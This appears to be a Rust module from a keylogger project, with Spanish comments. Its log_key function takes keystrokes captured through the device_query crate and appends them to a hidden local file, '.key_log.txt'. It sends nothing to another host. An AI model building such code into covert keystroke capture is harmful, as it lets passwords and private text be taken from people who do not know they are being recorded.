use device_query::Keycode;
use std::{fs::OpenOptions, io::prelude::*};

use super::key_map::get_key_mapping;

pub fn log_key(key: Keycode) {
    // obtener la representacion del keycode
    if let Some(character) = get_key_mapping(key) {
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(".key_log.txt")
            .expect("Eror al abrir el fichero!.");

        if let Err(e) = write!(file, "{}", character) {
            eprintln!("Error al escribir en el fichero: {}", e);
        }
    }
}
